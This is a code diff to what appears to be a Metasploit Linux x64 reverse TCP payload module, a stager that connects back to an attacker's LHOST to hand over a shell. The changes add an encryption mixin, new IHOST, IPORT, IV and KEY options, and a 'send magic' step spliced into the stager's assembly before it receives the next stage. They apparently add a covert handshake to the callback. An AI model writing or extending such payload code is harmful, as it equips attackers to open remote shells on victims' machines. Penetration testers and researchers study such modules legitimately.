@@ -13,7 +13,8 @@ module Payload::Linux::ReverseTcp_x64
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Linux
-
+  include Msf::Payload::Linux::SendMagicX64
+  include Rex::Crypto
   #
   # Generate the first stage
   #
@@ -21,6 +22,10 @@ module Payload::Linux::ReverseTcp_x64
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
+      ihost:         datastore['IHOST'],
+      iport:         datastore['IPORT'],
+      iv:            datastore['IV'],
+      key:           datastore['KEY'],
       retry_count:   datastore['StagerRetryCount'],
       sleep_seconds: datastore['StagerRetryWait'],
     }
@@ -38,6 +43,10 @@ module Payload::Linux::ReverseTcp_x64
   # for certain payloads if requested.
   #
   def include_send_uuid
+    false
+  end
+
+  def include_send_magic
     false
   end
 
@@ -164,6 +173,11 @@ module Payload::Linux::ReverseTcp_x64
         syscall ; exit(1)
 
       recv:
+    ^      
+
+    asm << asm_send_magic(opts) if include_send_magic
+
+    asm << %Q^
         pop    rsi
         push   0x#{read_length.to_s(16)}
         pop    rdx
